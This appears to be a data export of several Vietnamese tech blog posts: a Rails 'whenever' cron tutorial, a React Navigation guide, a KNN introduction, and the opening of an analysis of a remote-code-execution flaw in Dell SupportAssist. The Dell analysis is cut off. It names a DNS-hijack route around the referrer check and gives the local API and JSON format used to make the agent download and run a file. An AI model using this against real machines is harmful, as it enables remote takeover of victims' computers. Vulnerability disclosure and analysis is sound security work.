```ruby\n    whenever --update-crontab\n    ```\n- Output\n    ```\n    Crontab is run on production\n    [write] crontab file updated\n    ```\n- Ta có thể set giá trị của biến `@environment` bằng cách thêm đoạn code sau vào đầu file `config/schedule.rb`\n    ```ruby\n    # config/schedule.rb\n    set :environment, :development\n    ```\n- Sau đó chạy lại command `whenever --update-crontab`\n    ```ruby\n    whenever --update-crontab\n    ```\n- Output\n    ```\n    Crontab is run on development\n    [write] crontab file updated\n    ```\n- Tuy nhiên ta đang hard code giá trị của biến `@environment`, ta cần phải set giá trị của biến `@environment` thay đổi theo môi trường.\n- Để làm vậy ta cần sử dụng `Rails.env`, update lại file `config/schedule.rb` như sau\n    ```ruby\n    # config/schedule.rb\n    require_relative "environment"\n    set :environment, Rails.env\n    ```\n- Chúng ta cũng có thể quy định outout log của crontab bằng cách thêm đoạn code sau vào file `config/schedule.rb`\n    ```ruby\n    # config/schedule.rb\n    set :output, "log/cron_job.log"\n    ```\n- File `config/schedule.rb` hoàn chỉnh\n    ```ruby\n    # config/schedule.rb\n    require_relative "environment"\n\n    set :environment, Rails.env\n    set :output, "log/cron_job.log"\n\n    # puts "Crontab is run on #{@environment}"\n    # puts "Crontab is logged on #{@output}"\n\n    every 1.minutes do\n      rake "user:create_random"\n    end\n    ```\n- Chạy command để update crontab và check lại\n    ```ruby\n    whenever --update-crontab\n    whenever\n    ```\n- Output\n    ```ruby\n    * * * * * /bin/bash -l -c 'cd /home/hcm-102-0003/Desktop/demo_whenever_revise && RAILS_ENV=development bundle exec rake user:create_random --silent >> log/cron_job.log 2>&1'\n\n    ## [message] Above is your schedule file converted to cron syntax; your crontab file was not updated.\n    ## [message] Run `whenever --help' for more options.\n    ```\n- Bạn có thể check lại kết quả bằng cách mở file `log/cron_job.log` và xem lại log, dưới đây là log của mình\n    ```ruby\n    RUNNING rake user:create_random\n    CREATED user: #<User id: 12, email: "deanna.braun@brekke.ca", name: "Claretha Hintz", created_at: "2019-06-26 08:58:03", updated_at: "2019-06-26 08:58:03">\n    RUNNING rake user:create_random\n    CREATED user: #<User id: 13, email: "kathyrn.kris@king.name", name: "Debera Purdy", created_at: "2019-06-26 08:59:03", updated_at: "2019-06-26 08:59:03">\n    RUNNING rake user:create_random\n    CREATED user: #<User id: 14, email: "leontine@russel.biz", name: "Erminia Weber", created_at: "2019-06-26 09:00:03", updated_at: "2019-06-26 09:00:03">\n    ```\n    \n## c. Jobtypes:\n- Mặc định whenever cung cấp cho chúng ta 4 loại `jobtype` để chạy các crontab khác nhau.\n\n    1. **command**: chạy các command của linux hoặc rails app, ví dụ\n        ```ruby\n        command "echo 'example command'"\n        ```\n\n    2. **rake**: chạy các rake task của rails app, crontab trong bài viết này cũng có jobtype là rake\n        ```ruby\n        rake "user:create_random"\n        ```\n\n    3. **runner**: chạy các class method, trong source code tham khảo có bổ sung thêm 1 crontab có jobtype là runner, bạn có thể tham khảo thêm\n        ```ruby\n        runner "User.create_random"\n        ```\n\n    4. **script**: chạy script file, ví dụ\n        ```ruby\n        script "example_script"\n        ```\n- Bạn cũng có thể tự define thêm jobtype mới, tham khảo [document](https://github.com/javan/whenever#define-your-own-job-types) của gem whenever.\n\n## d. Date and time:\n### i. Gem Chronic:\n- Gem whenever đang sử dụng gem [Chronic](https://github.com/mojombo/chronic) để parse date time.\n- Theo mặc định Chronic sử dụng thời gian theo option 12h và có hậu tố `am` hoặc `pm` để phân biệt.\n- Bạn có thể sử dụng thời gian theo option 24h và không cần sử dụng hậu tố `am` hoặc `pm` để phân biệt bằng cách set `chronic_options` như sau.\n    ```ruby\n    set :chronic_options, hours24: true\n    ```\n- Khi đó thay vì viết `3:00 am` bạn có thể viết ngắn gọn là `3:00` hoặc `15:00` thay cho `3:00 pm`. \n- Các option date time trong `whenever` bao gồm\n    ```ruby\n    every n.minutes # or every :minute with n = 1 \n    every n.hours   # or every :hour with n = 1\n    every n.days    # or every :day with n = 1\n    every n.months  # or every :month with n = 1\n    every n.years   # or every :year with n = 1\n    \n    # hours in a day\n    every "1:00am" \n    ...\n    every "11:00am"\n    \n    # days in a week\n    every :monday\n    ...\n    every :sunday\n    \n    # days in a month\n    every "1st" \n    ...\n    every "31st"\n    \n    # months in a year\n    every :jan\n    ...\n    every :dec\n    ```\n- Bạn cũng có thể kết hợp các option để tạo ra các option phức tạp hơn.\n    ```ruby\n    every :day, at: "3:00am"\n    every :month, at: "1st"\n    every :year, at: :jan\n    ...\n    ```\n\n### ii. Timezone:\n- Hãy thử tưởng tượng Timezone Rails app của bạn là `Tokyo UTC +09:00` nhưng server của bạn lại được deploy và set Timezone là `UTC UTC +00:00`.\n- Khi đó crontab `11:00 am` của bạn sẽ được chạy lúc `11:00 am` của Timzone nào nhỉ.\n- Expectation của chúng ta là `11:00 am` của timezone `Tokyo UTC +09:00` .\n- Nhưng sự thật là `11:00 am` của timezone `UTC UTC +00:00`, tức là `08:00 pm` của timezone `Tokyo UTC +09:00`.\n- Để tránh tình trạng này chúng ta có 2 solution.\n    ```\n    Solution 1: set timezone của server deploy trùng với timezone của app\n    ```\n- Với solution này thì chúng ta không cần implement thêm code.\n    ```\n    Solution 2: convert timezone của rails app sang timezone của server\n    ```\n- Với solution này thì chúng ta cần implement thêm hàm convert time của app sang timezone  của server\n    ```ruby\n    def server_timezone time\n      Time.zone.parse(time).localtime\n    end\n\n    every :day, at: server_timezone("11:00 am") do\n      command "echo 'example command'"\n    end\n    ```\n- Bạn có thểm tham khảo thêm ở [issue#239](https://github.com/javan/whenever/pull/239#issuecomment-13864270).\n\n## e. Các vấn đề khác:\n### i. Deploy:\n- Nếu bạn sử dụng capistrano, bạn có thể tham khảo [document](https://github.com/javan/whenever#capistrano-integration) của whenever.\n- Nếu bạn sử dụng mina, bạn có thể tham khảo thêm gem [mina-whenever](https://github.com/mina-deploy/mina-whenever).\n- Nếu bạn sử dụng heroku, bạn có thể tham khảo thêm add-ons [Heroku Scheduler](https://devcenter.heroku.com/articles/scheduler).\n### ii. Test:\n- Gem [whenever-test](https://github.com/rafaelsales/whenever-test) được recommend để viết test cho gem whenever.\n- Bạn có thể tham khảo thêm về gem [shoulda-whenever](https://github.com/MGerrior/shoulda-whenever) và [example code](https://devpost.com/software/shoulda-matchers-for-whenever) của gem shoulda-whenever.\n\n# 4. Document:\n- Source code demo mình đang để ở [github](https://github.com/LeTanThanh/demo_whenever_revise), các bạn có thể clone về để tham khảo.\n- Document của [whenever](https://github.com/javan/whenever).\n- Bài viết là những kinh nghiệm mình có được khi tìm hiểu và  sử dụng gem whenever khi làm dự án thực tế, mong đươc các bạn đóng góp thêm ý kiến để mình hoàn thiện thêm bái viết này.	![](https://images.viblo.asia/8e50ee2e-dcad-4e42-b4f7-83657ad68ab9.png)\n\n\n1. Cron job là gì:\n- Đôi khi chúng ta cần implement các job cần được thực hiện theo 1 schedule cho trước, các job này được gọi chung là cron job.\n- Các job này có thể là gửi remind email cho user hằng ngày, gọi API crawl data của third party để import hoặc update data của app mỗi tuần 1 lần, xóa cache, xóa log, backup database, ...\n- Trong Rails chúng ta có thể sử dụng gem whenever để lên sche...	{https://images.viblo.asia/8e50ee2e-dcad-4e42-b4f7-83657ad68ab9.png}	1	Cron job with gem whenever	{cronjob,whenever,gem,rubyonrails}	0	f	2022-12-18 15:33:38.051+00	2022-12-18 15:33:38.051+00
31992	## 1. Project Setup\nTrước khi bắt đầu, hãy đảm bảo bạn đã cài đặt các phần sau trong hệ thống máy tính của mình:\n- IDE: XCode (dành cho máy Mac), và Android Studio\n- [Node](https://nodejs.org/en/download/) latest version (phiên bản mới nhất)\n- Code Editor ( Visual studio code ) with terminal.\n\nTrong bài viết này, mình sẽ sử dụng Xcode để build ứng dụng trên IOS.\n\nGiả sử bạn đã cài đặt Node, open terminal và chạy lệnh sau:\n```\nnpm install -g react-native-cli\n```\nReact-native-cli sẽ được cài đặt trong hệ thống của bạn. Sau khi cài xong, chạy command dưới để tạo ứng dụng:\n```\nreact-native init MyProjectName\n```\nChờ vài phút cho đến khi dự án được cài đặt. Sau khi thực hiện xong, truy cập vào thư mục của ứng dụng bạn vừa tạo:\n```\ncd MyProjectName\n```\nBạn có thể thấy cấu trúc code đầy đủ của ứng dụng được cài đặt với các file và thư mục mặc định được cung cấp bởi React-native-cli.\n![](https://images.viblo.asia/ab762526-1977-4eed-9533-62956f4ef9cb.png)\n\n## 2. Creating Screens and Components\nSau khi hoàn thành việc thiết lập môi trường dự án. Bây giờ chúng ta sẽ tạo các màn hình và các thành phần (component) sẽ sử dụng trong ứng dụng của mình.\n### 2.1 Creating the src folder\nNgay bên dưới thư mục `node modules`, thêm một thư mục và đặt tên là `src`.\nThực ra, bạn có thể đặt tên cho thư mục là gì cũng được. Mình đặt tên nó là src vì nó thường được khuyến nghị để giúp các nhà phát triển khác (developer) hiểu, biết được nơi chứa mã nguồn của ứng dụng.\nKhi bạn đã tạo thư mục src, bạn phải tạo thêm hai thư mục bên trong thư mục src. Một cho các màn hình mà bạn sẽ tạo và một cho các thành phần (components). Cấu trúc code của bạn sẽ trông giống như sau:\n![](https://images.viblo.asia/550508db-ed01-4c82-a0e4-49d85239971c.png)\n\nSau khi tạo folder xong, tiến hành cài đặt React Navigation. Mình sẽ sử dụng React Navigation để navigate giữa các màn hình. Chạy command line sau để cài đặt:\n```\nnpm install react-navigation\n```\nSau khi React Navigation được cài đặt, hãy chuyển đến cấu trúc thư mục và tạo một tệp có tên là Route.js. Nơi này sẽ chứa mã code để điều hướng giữa các màn hình trong ứng dụng. Nó nên được thêm vào bên ngoài thư mục src:\n![](https://images.viblo.asia/b44be8e1-4ce1-4877-ac58-8e703bfa2948.png)\n\nBên trong file Routes.js, implement như sau:\n```javascript\nimport React, { Component } from "react";\nimport { createStackNavigator, createAppContainer } from 'react-navigation';\nimport Home from "./src/screens/Home";\nimport Profile from "./src/screens/Profile";\nconst Project= createStackNavigator({\n  Home: {\n   screen: Home\n  },\n  Profile: {\n   screen: Profile\n  }\n});\nexport default createAppContainer(Project);\n```\n\nBạn có thể thấy trong đoạn mã ở trên mình đã định nghĩa 2 file đó là `Home` và `Profile` - và sử dụng chúng trong navigation component. 2 tệp này về cơ bản là các màn hình chứa mã code cho ứng dụng.\nTiếp theo, chuyển đến tệp App.js trong thư mục dự án của bạn và xóa tất cả mã hiện có. Sau đó, thêm các dòng mã sau:\n```javascript\nimport React, {Component} from "react";\nimport Routes from "./Routes";\nconst App = () => <Routes/>\nexport default App;\n```\n\nKhi bạn đã hoàn tất các thay đổi trong tệp App.js, thay đổi tệp index.js để hoàn tất quy trình điều hướng.\n```javascript\nimport { AppRegistry } from 'react-native';\nimport App from './App';\nconsole.ignoredYellowBox = ['Warning: Each', 'Warning: Failed'];\nAppRegistry.registerComponent('AwesomeProject', () => App);\n```\n\nVậy là xong, thiết lập điều hướng đã hoàn tất, chúng ta có thể tiến tới việc tạo các màn hình và các thành phần (components) của riêng mình cho ứng dụng.\n\n## 3. Screens Creation and Navigation\nChuyển đến screen folder trong thư mục src bạn đã tạo và thêm hai file - Home.js và Profile.js\nKhi bạn đã hoàn tất việc tạo các tệp đó, viết code và liên kết chúng để điều hướng giữa cả hai màn hình. Như này này: \n\n### Home.js\n```javascript\nimport React from 'react';\nimport { Button, View, Text } from 'react-native';\nclass Home extends React.Component {\n  static navigationOptions = {\n    title: 'Home'\n   };\nrender() {\n return (\n  <View style={{ \n   flex: 1,\n   alignItems:'center',\n   justifyContent:'center'\n  }}>\n<Button title="Go to Profile screen"\n    onPress={() => this.props.navigation.navigate('Profile')}\n   />\n  </View>\n);\n}\n}\nexport default Home;\n```\n\n### Profile.js\n```javascript\nimport React from 'react';\nimport { Button, View, Text } from 'react-native';\nclass Profile extends React.Component {\n  static navigationOptions = {\n    title: 'Profile'\n   };\n render() {\n return (\n  <View style={{ \n   flex: 1,\n   alignItems:'center',\n   justifyContent:'center'\n  }}>\n<Button title="Go to Home screen"\n    onPress={() => this.props.navigation.navigate('Home')}\n   />\n  </View>\n);\n}\n}\nexport default Profile;\n```\n\nBạn sẽ nhận thấy rằng code cho cả hai tệp gần giống nhau. Điều này là do chúng ta đang tập trung vào điều hướng và không phải vào việc tạo nội dung. Về nội dung cho từng màn hình chúng ta có thể thực hiện ở các phần tiếp theo.\n\nXONG RỒI!!!! Chạy thử ngay thôi :D\n\nRun command line sau: \n- IOS:\n```\nreact-native run-ios\n```\n\nhoặc \n\n- Android: \n```\nreact-native run-android\n```\n\nVà Kết quả là đây. \n- HOME screen:\n\n![](https://images.viblo.asia/ab50c637-b996-4d2d-8508-1398df598f69.png)\n- PROFILE  screen:\n\n![](https://images.viblo.asia/074d051c-8030-4b17-a4b1-942ced810399.png)\n\nNguồn tham khảo: https://medium.com/better-programming/react-native-navigating-between-the-screens-and-code-structure-for-beginners-6b815ee8f79	1. Project Setup\nTrước khi bắt đầu, hãy đảm bảo bạn đã cài đặt các phần sau trong hệ thống máy tính của mình:\n- IDE: XCode (dành cho máy Mac), và Android Studio\n- Node latest version (phiên bản mới nhất)\n- Code Editor ( Visual studio code ) with terminal.\n\nTrong bài viết này, mình sẽ sử dụng Xcode để build ứng dụng trên IOS.\n\nGiả sử bạn đã cài đặt Node, open terminal và chạy lệnh sau:\nReact-nat...	{https://images.viblo.asia/ab762526-1977-4eed-9533-62956f4ef9cb.png,https://images.viblo.asia/550508db-ed01-4c82-a0e4-49d85239971c.png,https://images.viblo.asia/b44be8e1-4ce1-4877-ac58-8e703bfa2948.png,https://images.viblo.asia/ab50c637-b996-4d2d-8508-1398df598f69.png,https://images.viblo.asia/074d051c-8030-4b17-a4b1-942ced810399.png}	1	React Navigation cho người mới bắt đầu	{navigation,android,ios,react-native}	0	f	2022-12-18 15:33:38.083+00	2022-12-18 15:33:38.083+00
32017	# KNN là gì?\n&nbsp; &nbsp;&nbsp; &nbsp; KNN (K-Nearest Neighbors) là một trong những thuật toán học có giám sát đơn giản nhất được sử dụng nhiều trong khai phá dữ liệu và học máy. Ý tưởng của thuật toán này là nó không học một điều gì từ tập dữ liệu học (nên KNN được xếp vào loại lazy learning), mọi tính toán được thực hiện khi nó cần dự đoán nhãn của dữ liệu mới. <br>\n&nbsp; &nbsp;&nbsp; &nbsp;Lớp (nhãn) của một đối tượng dữ liệu mới có thể dự đoán từ các lớp (nhãn) của k hàng xóm gần nó nhất.\n## Ví dụ:\n&nbsp; &nbsp;&nbsp; &nbsp;Giả sử ta có D là tập các dữ liệu đã được phân loại thành 2 nhãn (+) và (-) được biểu diễn trên trục tọa độ như hình vẽ và một điểm dữ liệu mới A chưa biết nhãn. Vậy làm cách nào để chúng ta có thể xác định được nhãn của A là (+) hay (-)?<br>\n&nbsp; &nbsp;&nbsp; &nbsp;Có thể thấy cách đơn giản nhất là so sánh tất cả các đặc điểm của dữ liệu A với tất cả tập dữ liệu học đã được gắn nhãn và xem nó giống cái nào nhất, nếu dữ liệu (đặc điểm) của A giống với dữ liệu của điểm mang nhãn (+) thì điểm A mang nhãn (+), nếu dữ liệu A giống với dữ liệu nhãn (-) hơn thì nó mang nhãn (-), trông có vẻ rất đơn giản nhưng đó là những gì mà KNN làm.<br>\n&nbsp; &nbsp;&nbsp; &nbsp;Trong trường hợp của KNN, thực tế nó không so sánh dữ liệu mới (không được phân lớp) với tất cả các dữ liệu khác, thực tế nó thực hiện một phép tính toán học để đo khoảng cách giữa dữ liệu mới với tất cả các điểm trong tập dữ liệu học D để thực hiện phân lớp. Phép tính khoảng cách giữa 2 điểm có thể là Euclidian, Manhattan, trọng số, Minkowski, …\n\n![](https://images.viblo.asia/7fc8b286-3585-4404-933d-e253892d80e4.png)\n# Các bước trong KNN\n1. Ta có D là tập các điểm dữ liệu đã được gắn nhãn và A là dữ liệu chưa được phân loại.\n2. Đo khoảng cách (Euclidian, Manhattan, Minkowski, Minkowski hoặc Trọng số) từ dữ liệu mới A đến tất cả các dữ liệu khác đã được phân loại trong D.\n3. Chọn K (K là tham số mà bạn định nghĩa) khoảng cách nhỏ nhất.\n4. Kiểm tra danh sách các lớp có khoảng cách ngắn nhất và đếm số lượng của mỗi lớp xuất hiện.\n5. Lấy đúng lớp (lớp xuất hiện nhiều lần nhất).\n6. Lớp của dữ liệu mới là lớp mà bạn đã nhận được ở bước 5.\n\n## Ví dụ:\n![](https://images.viblo.asia/4afa3038-3cfd-4635-9a25-c5ae3df8fc11.png)\nGiả sử ta có tập dữ liệu D có gắn nhãn gồm 15 điểm như trên ảnh.\n1. Điểm cần dự đoán nhãn A(3,9)\n2. Ta tính khoảng cách từ điểm A đến các điểm dữ liệu trong D bằng công thức Euclidian.\n3. Ta chọn K= 5, và tìm ra 5 điểm có khoảng cách gần với điểm A nhất.\n4. Trong 5 điểm ta thấy có 4 điểm mang nhãn (+) và 1 điểm mang nhãn (-).\n5. Vậy ta có thể đưa ra kết luận là điểm A cần dự đoán mang nhãn (+).\n\n![](https://images.viblo.asia/d81e4e76-5ee1-4a92-b719-74cdcdac01d2.png)\n\n# Ưu điểm\n\n1.  Thuật toán đơn giản, dễ dàng triển khai.\n2.  Độ phức tạp tính toán nhỏ.\n3.  Xử lý tốt với tập dữ liệu nhiễu\n\n# Nhược điểm\n1. Với K nhỏ dễ gặp nhiễu dẫn tới kết quả đưa ra không chính xác\n2. Cần nhiều thời gian để thực hiện do phải tính toán khoảng cách với tất cả các đối tượng trong tập dữ liệu.\n3. Cần chuyển đổi kiểu dữ liệu thành các yếu tố định tính. \n\n<br>Trong bài tiếp theo chúng ta sẽ xây dựng một mã nguồn mô phỏng thuật toán KNN trong thực tế.	KNN là gì?\n&nbsp; &nbsp;&nbsp; &nbsp; KNN (K-Nearest Neighbors) là một trong những thuật toán học có giám sát đơn giản nhất được sử dụng nhiều trong khai phá dữ liệu và học máy. Ý tưởng của thuật toán này là nó không học một điều gì từ tập dữ liệu học (nên KNN được xếp vào loại lazy learning), mọi tính toán được thực hiện khi nó cần dự đoán nhãn của dữ liệu mới. <br>\n&nbsp; &nbsp;&nbsp; &nbsp;L...	{https://images.viblo.asia/7fc8b286-3585-4404-933d-e253892d80e4.png,https://images.viblo.asia/4afa3038-3cfd-4635-9a25-c5ae3df8fc11.png,https://images.viblo.asia/d81e4e76-5ee1-4a92-b719-74cdcdac01d2.png}	1	KNN (K-Nearest Neighbors) #1	{classification,supervised-learning,ai,knn,lazylearning}	0	f	2022-12-18 15:33:37.839+00	2022-12-18 15:33:37.839+00
32019	# 1. Tổng quan\n**Nếu anh em nào đó đang sử dụng máy tính DELL mà lâu lâu rồi chưa update thì hãy cẩn thận đấy... Sau bài viết này các bạn có thể trở thành những "nạn nhân" cho các anh em khác thử nghiệm đấy.** <br>\n&nbsp;&nbsp;Cụ thể, một người nghiên cứu bảo mật 17 tuổi tên là Bill Demirkapi đã phát hiện ra lổ hổng bảo  mật nghiêm trọng này trên các thiết bị của Dell. Lổ hổng này cho phép tin tặc có thể điều khiển máy tính nạn nhân từ xa thông qua phần mềm **Dell SupportAssist**.<br>\n\n![](https://images.viblo.asia/6d393182-fe33-4a6d-8cb2-60d3b82a0aeb.png)\n# 2.  Phát hiện và phân tích luồng xử lý\n## 2.1. Con đường phát hiện\n&nbsp;Khi tiến hành cài đặt các driver cho máy tính khi người dùng truy cập vào trang hỗ trợ của Dell chúng ta có các tùy chọn sau để cho hệ thống có thể nhận biết được thiết bị của bạn và từ đó đưa ra các file driver phù hợp. <br>\n\n![](https://images.viblo.asia/25602119-cc78-40f8-a289-ba5061ffe4cf.png)\n\n&nbsp; Ở đây có tùy chọn **Detect PC** . Vậy nó sẽ làm thế nào để phát hiện PC của chúng ta. Khi nhấn vào tùy chọn đó.  Nó sẽ đưa chúng ta đến trang yêu cầu cài đặt phần mềm này:<br>\n\n![](https://images.viblo.asia/cbade509-232f-465f-96ab-c11245e41e8c.png)\n\n&nbsp;\nĐây là  một chương trình tự động cài đặt driver cho thiết bị dell. Mặc dù nó là một tính năng tiện lợi, nhưng nó có vẻ nguy hiểm. Điều rất đáng ngờ là Dell tuyên bố có thể cập nhật driver thông qua một trang web. <br>\n\nSau khi cài đặt xong, nó tạo ra 2 dịch vụ chạy trên thiết bị là *SupportAssistAgent* và *Dell Hardware Support*. Quay lại website vừa nãy. . Mở dev tools của Chrome và vào tabs Network. Khi ta click vào  **Detect Drivers**. <br> \n\n![](https://i.imgur.com/3koDq6L.png)\n\n&nbsp; Ở devtool tabs Network ta thấy: \n\n![](https://i.imgur.com/bEVfaii.png)\n\nThầy rằng website này đã tạo các request đến **localhost** với port 8884. Sử dụng process hacker kiểm tra dịch vụ trên port 8884, thấy rằng *Support Assist Agent* đang hoạt động trên port đó như là 1 dịch vụ web.<br>\n## 2.2  Bước đầu phân tích \n   Qua đây thấy rằng, Những gì Dell đang làm là đưa ra một loại API REST trong dịch vụ của họ, cho phép liên lạc từ trang web của Dell để thực hiện các yêu cầu khác nhau như thu thập thông tin hệ thống, tải xuống một phần mềm từ máy chủ và cài đặt nó lên hệ thống. Dịch vụ web này được bảo vệ bằng respone header *Access-Control-Allow-Origin*  chỉ nhận lệnh thực thi từ "dell.com" hoặc các subdomain của Dell mà thôi. \n    <br><br>\nVề phía trình duyệt web, khách hàng đã cung cấp một chữ ký để xác thực các lệnh khác nhau. Những chữ ký này được tạo bằng cách gửi yêu cầu tới https://www.dell.com/support/home/us/en/04/drivers/driversbyscan/getdsdtoken và cũng cung cấp khi chữ ký hết hạn. Sau khi nhấn Download Driver, thấy rằng request này rất "hay ho":<br>\n    \n   ![](https://images.viblo.asia/77e7008d-0eb6-48ae-b193-f9b29fc149d4.png)\n    \n* Request này đã chuyển hướng lệnh thực thi sang cho *Support Assist Agent* để download và cài đặt chương trình lên hệ thống.<br>\n* Khi bắt đầu, Dell SupportAssist khởi động một máy chủ E web (System.Net.HttpListener) trên một trong ba cổng 8884, 8883, 8886 hoặc cổng 8885. Cổng này phụ thuộc vào tùy chọn nào có sẵn, bắt đầu từ 8884. Theo yêu cầu, ListenerCallback nằm trong HttpListenerServiceFacade gọi ClientServiceHandler.ProcessRequest\n* ClientServiceHandler.ProcessRequest, **base web server function**, bắt đầu bằng cách thực hiện kiểm tra tính toàn vẹn, ví dụ như đảm bảo yêu cầu đến từ local machine và nhiều kiểm tra khác.\n* Sau 1 số kỹ thuật dịch ngược, thấy rằng kiểm tra tính toàn vẹn quan trọng nằm trong ClientServiceHandler.ProcessRequest, cụ thể là chỗ máy chủ kiểm tra **referrer** để  bảo đảm  đến từ Dell. ProcessRequest gọi chức năng sau để đảm bảo rằng yêu cầu đến từ Dell: \n```\n// Token: 0x060000A8 RID: 168 RVA: 0x00004EA0 File Offset: 0x000030A0\npublic static bool ValidateDomain(Uri request, Uri urlReferrer)\n{\n\treturn SecurityHelper.ValidateDomain(urlReferrer.Host.ToLower()) && (request.Host.ToLower().StartsWith("127.0.0.1") || request.Host.ToLower().StartsWith("localhost")) &&request.Scheme.ToLower().StartsWith("http") && urlReferrer.Scheme.ToLower().StartsWith("http");\n}\n\n// Token: 0x060000A9 RID: 169 RVA: 0x00004F24 File Offset: 0x00003124\npublic static bool ValidateDomain(string domain)\n{\n\treturn domain.EndsWith(".dell.com") || domain.EndsWith(".dell.ca") || domain.EndsWith(".dell.com.mx") || domain.EndsWith(".dell.com.br") || domain.EndsWith(".dell.com.pr") || domain.EndsWith(".dell.com.ar") || domain.EndsWith(".supportassist.com");\n}\n```\n\n&nbsp;&nbsp;Vấn đề với chức năng trên là thực tế nó kiểm tra chưa chặt chẽ và cung cấp cho attacker rất nhiều tùy chọn để tấn công.  Để bypass qua kiểm tra này chúng ra có vài tùy chọn: \n    \n1. Tìm lỗ hổng Cross Site Scripting trong bất kỳ trang web nào của Dell (phải tìm một lỗ hổng trên các trang web được chỉ định cho SupportAssist). Rất khó khăn.\n2. Tìm một lỗ hổng Subdomain Takeover\n3. Thực hiện yêu cầu từ một local program.\n4. Tạo một tên miền phụ ngẫu nhiên và sử dụng một máy bên ngoài để DNS Hijack nạn nhân. Sau đó, khi nạn nhân yêu cầu [xxx] .dell.com, ta sẽ respone với máy chủ của chúng ta.\n    \nCuối cùng, phương án 4 là khả thi nhất.<br>\n## 2.3 Phát hiện điểm yếu trong logic sử lý\n&nbsp;&nbsp;Trong quá trình phân tích, phát hiện ra một số vấn đề sau. Lúc đầu, trang web cố gắng phát hiện SupportAssist bằng cách lặp qua các cổng dịch vụ đã nói ở trên và kết nối với Service Method “isalive”. Điều thú vị là nó đã vượt qua “Signature” parameter và một “Expires” parameter. Để tìm hiểu thêm, phân tích JS ta được một số vấn đề sau:\n    \n1. Đầu tiên, trình duyệt đưa ra yêu cầu https://www.dell.com/support/home/us/en/04/drivers/driversbyscan/getdsdtoken và nhận được Token mới nhất, hoặc các chữ ký [Signature] mà  đã nói trước đó.  Cuối cũng cung cấp mã thông báo Hết hạn sử dụng "Expires token". Điều này giải quyết vấn đề chữ ký.\n2. Tiếp theo, trình duyệt đưa ra yêu cầu cho mỗi cổng dịch vụ với kiểu như sau: `http://127.0.0.1:[SERVICEPORT[/clentservice/aluive/?Exires=[EXPIRES[&signature=[SIGNATURE]`.\n3. Sau đó, ứng dụng khách *Support Assist* phản hồi khi đạt đến cổng dịch vụ phù hợp, với kiểu như sau:\n```\n{\n "isAlive": true,\n "clientVersion": "[CLIENT VERSION]",\n "requiredVersion": null,\n "success": true,\n "data": null,\n "localTime": [EPOCH TIME],\n "Exception": {\n     "Code": null,\n     "Message": null,\n     "Type": null\n }\n}\n```\n4. Khi trình duyệt thấy điều này, nó sẽ tiếp tục với các yêu cầu tiếp theo sử dụng cổng dịch vụ hiện được xác định.\n\nSau một thời gian lần mò, đã tìm ra được một số dịch vụ/câu lệnh "hay ho": <br> \n```\nclientservice_getdevicedrivers - Grabs available updates.\ndiagnosticsservice_executetip - Takes a tip guid and provides it to the PC Doctor service (Dell Hardware Support).\ndownloadservice_downloadfiles - Downloads a JSON array of files.\nclientservice_isalive - Used as a heartbeat and returns basic information about the agent.\nclientservice_getservicetag - Grabs the service tag.\nlocalclient_img - Connects to SignalR (Dell Hardware Support).\ndiagnosticsservice_getsysteminfowithappcrashinfo - Grabs system information with crash dump information.\nclientservice_getclientsysteminfo - Grabs information about devices on system and system health information optionally.\ndiagnosticsservice_startdiagnosisflow - Used to diagnose issues on system.\ndownloadservice_downloadmanualinstall - Downloads a list of files but does not execute them.\ndiagnosticsservice_getalertsandnotifications - Gets any alerts and notifications that are pending.\ndiagnosticsservice_launchtool - Launches a diagnostic tool.\ndiagnosticsservice_executesoftwarefixes - Runs remediation UI and executes a certain action.\ndownloadservice_createiso - Download an ISO.\nclientservice_checkadminrights - Check if the Agent privileged.\ndiagnosticsservice_performinstallation - Update SupportAssist.\ndiagnosticsservice_rebootsystem - Reboot system.\nclientservice_getdevices - Grab system devices.\ndownloadservice_dlmcommand - Check on the status of or cancel an ongoing download.\ndiagnosticsservice_getsysteminfo - Call GetSystemInfo on PC Doctor (Dell Hardware Support).\ndownloadservice_installmanual - Install a file previously downloaded using downloadservice_downloadmanualinstall.\ndownloadservice_createbootableiso - Download bootable iso.\ndiagnosticsservice_isalive - Heartbeat check.\ndownloadservice_downloadandautoinstall - Downloads a list of files and executes them.\nclientservice_getscanresults - Gets driver scan results.\ndownloadservice_restartsystem - Restarts the system.\n```\n\n&nbsp;Thứ khiến chúng ta quan tâm là  **downloadservice_downloadandautoinstall** nó sẽ tải tệp từ một  được chỉ định và sau đó chạy nó. Phương pháp này được chạy bởi trình duyệt khi người dùng cần cài đặt một số trình điều khiển nhất định cần được cài đặt tự động. Thông qua đây chúng ta có thể bắt nạn nhận tải xuống và thực thi 1 file độc hại...<br><br>\n            \n## 2.4 Phân tích quá trình thực thi việc tự động tải về và thực thi (**downloadservice_downloadandautoinstall**)\n\n   1. Sau khi tìm thấy trình điều khiển nào cần cập nhật, trình duyệt sẽ tạo một yêu cầu POST cho tới \n    \n`http://127.0.0.1:[SERVICEPORT]/downloadservice/downloadandautoinstall?expires=[EXPIRES]&signature=[SIGNATURE]`\n    \n   2. Trình duyệt gửi yêu cầu có cấu trúc JSON sau đây:\n    \n```\n[\n {\n "title":"DOWNLOAD TITLE",\n "category":"CATEGORY",\n "name":"FILENAME",\n "location":"FILE URL",\n "isSecure":false,\n "fileUniqueId":"RANDOMUUID",\n "run":true,\n "installOrder":2,\n "restricted":false,\n "fileStatus":-99,\n "driverId":"DRIVER ID",\n "dupInstallReturnCode":0,\n "cssClass":"inactive-step",\n "isReboot":false,\n "scanPNPId":"PNP ID",\n "$$hashKey":"object:210"\n }\n] \n```\n            \n3. Sau khi thực hiện kiểm tra tính toàn vẹn cơ bản mà đã thảo luận trước đó, ClientServiceHandler.ProcessRequest sẽ gửi ServiceMethod và các tham số đã  truyền cho ClientServiceHandler.HandlePost.\n4. ClientServiceHandler.HandlePost trước tiên đặt tất cả các tham số vào một mảng, sau đó gọi ServiceMethodHelper.CallServiceMethod.\n5. ServiceMethodHelper.CallServiceMethod hoạt động như một chức năng điều phối và gọi hàm được cung cấp ServiceMethod. Đây là phương thức **downloadandautoinstallinstall**: <br>\n```\nif (service_Method == "downloadservice_downloadandautoinstall")\n{\n string files5 = (arguments != null && arguments.Length != 0 && arguments[0] != null) ? arguments[0].ToString() : string.Empty;\n result = DownloadServiceLogic.DownloadAndAutoInstall(files5, false);\n} \n```\n\n6. DownloadServiceLogic.DownloadAutoInstall hoạt động như một trình wrapper (i.e handling exceptions) cho DownloadServiceLogic._HandleJson.\n7. DownloadServiceLogic._HandleJson sẽ deserializes payload JSON chứa danh sách các tệp cần tải xuống và thực hiện kiểm tra tính toàn vẹn sau đây\n```\nforeach (File file in list)\n{\n bool flag2 = file.Location.ToLower().StartsWith("http://");\n if 